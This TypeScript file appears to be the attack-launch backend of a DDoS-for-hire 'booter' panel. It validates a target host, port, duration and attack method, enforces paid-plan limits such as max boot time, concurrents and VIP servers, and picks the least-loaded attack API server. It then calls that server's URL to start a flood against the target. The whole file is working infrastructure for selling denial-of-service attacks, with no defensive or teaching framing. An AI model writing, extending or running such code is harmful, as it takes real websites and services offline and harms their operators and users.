import { HttpError } from "../core/09-errors";
import { webDb, expireFinishedAttacks } from "../lib/db/web";
import { withLock } from "../lib/lock";
import { assertAllowedMethod, assertPublicTarget, buildAttackUrl } from "../lib/targets";

export interface AttackPlan {
    mbt: number;
    concurrents: number;
    vip?: boolean;
}

export interface AttackInput {
    host: string;
    port: string;
    time: string;
    method: string;
    serverName?: string;
}

export interface AttackResult {
    host: string;
    port: string;
    seconds: number;
    method: string;
    server: string;
}

interface ApiServerRow {
    id: number;
    name: string;
    api: string;
    slots: number;
    methods: string;
    vip: number;
}

/**
 * Single implementation for user and admin launches. Every path validates the
 * target, the method, quotas and the URL template before touching the network.
 * Per-user lock closes the check-then-act race on concurrency limits.
 */
export async function launchAttack(options: {
    username: string;
    plan?: AttackPlan;
    input: AttackInput;
    admin: boolean;
    origin: "web" | "admin";
}): Promise<AttackResult> {
    const { input, plan, admin } = options;
    const host = await assertPublicTarget(input.host ?? "");
    const seconds = Number(input.time ?? "");
    if (!Number.isInteger(seconds) || seconds <= 0 || seconds > 3600) {
        throw new HttpError(400, "Invalid attack time.");
    }
    const port = Number(input.port || "80");
    if (!Number.isInteger(port) || port < 1 || port > 65535) {
        throw new HttpError(400, "Invalid port. Must be between 1 and 65535.");
    }
    if (plan && seconds > plan.mbt) {
        throw new HttpError(400, `Max attack time for your plan is ${plan.mbt}s.`);
    }

    const methods = (await webDb.methods.findMany({ select: { name: true } })) as Array<{
        name: string;
    }>;
    const methodNames = methods.map((m) => m.name).filter(Boolean);
    const method = String(input.method ?? "").trim();
    assertAllowedMethod(method, methodNames);

    const lockKey = admin ? "hub:admin" : `hub:${options.username}`;
    return withLock(lockKey, async () => {
        expireFinishedAttacks();
        if (plan && !admin) {
            const running = await webDb.logs.count({
                where: { user: options.username, stopped: 0, time: { gt: 0 } },
            });
            if (running >= plan.concurrents) {
                throw new HttpError(
                    429,
                    `Concurrent attack limit reached (${plan.concurrents}). Wait for a running attack to finish.`
                );
            }
            const settings = await webDb.settings.findFirst({
                select: { cooldown: true, cooldownTime: true, maxattacks: true },
            });
            const now = Math.floor(Date.now() / 1000);
            const cooldown = settings?.cooldown ? Number(settings.cooldownTime) : 0;
            if (cooldown > 0) {
                const last = await webDb.logs.findFirst({
                    where: { user: options.username, time: { gt: 0 } },
                    orderBy: { date: "desc" },
                    select: { date: true },
                });
                if (last && now - last.date < cooldown) {
                    throw new HttpError(
                        429,
                        `Cooldown active. Please wait ${cooldown - (now - last.date)} seconds.`
                    );
                }
            }
            const maxAttacks = Number(settings?.maxattacks ?? 0);
            if (maxAttacks > 0) {
                const recent = await webDb.logs.count({
                    where: {
                        user: options.username,
                        date: { gte: now - 86400 },
                        time: { gt: 0 },
                    },
                });
                if (recent >= maxAttacks) {
                    throw new HttpError(
                        429,
                        `Daily attack limit reached (${maxAttacks} per 24 hours).`
                    );
                }
            }
        }

        const servers = (await webDb.api.findMany()) as ApiServerRow[];
        const candidate = input.serverName
            ? servers.find((s) => s.name === input.serverName)
            : undefined;
        const matching = servers.filter((s) =>
            String(s.methods ?? "")
                .split(",")
                .map((m) => m.trim().toUpperCase())
                .includes(method.toUpperCase())
        );
        if (candidate && !matching.includes(candidate)) {
            throw new HttpError(400, "The selected API server does not support that method.");
        }
        const pool = (candidate ? [candidate] : matching).filter((server) => {
            if (admin) return true;
            if (Number(server.vip) !== 1) return true;
            return Boolean(options.plan?.vip);
        });
        if (pool.length === 0) throw new HttpError(403, "That server is reserved for VIP plans.");

        let best: ApiServerRow | undefined;
        let lowest = Infinity;
        for (const server of pool) {
            if (!server.api || !server.api.includes("[")) continue;
            const active = await webDb.logs.count({
                where: { stopped: 0, handler: server.name, time: { gt: 0 } },
            });
            const available = server.slots - active;
            if (available > 0 && active < lowest) {
                lowest = active;
                best = server;
            }
        }
        if (!best) throw new HttpError(429, "All API servers are at full capacity.");

        const attackUrl = buildAttackUrl(best.api, {
            host,
            port: String(port),
            time: String(seconds),
            method,
        });
        // The operator-configured API endpoint is itself an SSRF sink: a
        // compromised admin account must not be able to point it at metadata
        // or loopback.
        try {
            await assertPublicTarget(new URL(attackUrl).hostname);
        } catch {
            throw new HttpError(500, "The API server URL must target a public host.");
        }

        // Reserve the slot before the network call. The per-user lock does not
        // serialize different users, so this second lock is what keeps the
        // server's slot count honest under concurrent launches.
        const now = Math.floor(Date.now() / 1000);
        let logId = 0;
        const chosen = best;
        await withLock("server:" + chosen.name, async () => {
            expireFinishedAttacks();
            const active = await webDb.logs.count({
                where: { stopped: 0, handler: chosen.name, time: { gt: 0 } },
            });
            if (active >= chosen.slots) {
                throw new HttpError(429, "All API servers are at full capacity.");
            }
            const created = await webDb.logs.create({
                data: {
                    user: admin ? "admin" : options.username,
                    ip: host,
                    time: seconds,
                    method,
                    postdata: String(port),
                    mode: "api",
                    ratelimit: "0",
                    cookie: "0",
                    date: now,
                    chart: new Date(now * 1000).toISOString().slice(0, 19).replace("T", " "),
                    stopped: 0,
                    handler: chosen.name,
                    origin: options.origin,
                },
            });
            logId = Number(created.id);
        });

        let ok = false;
        try {
            const res = await fetch(attackUrl, {
                method: "GET",
                redirect: "manual",
                signal: AbortSignal.timeout(10_000),
            });
            ok = res.ok;
        } catch {
            // Handled below: the reservation is released and the failure logged.
        }

        if (!ok) {
            await webDb.logs.update({
                where: { id: logId },
                data: { stopped: 1, time: 0 },
            });
            throw new HttpError(502, "The API server could not start the attack.");
        }

        return { host, port: String(port), seconds, method, server: chosen.name };
    });
}
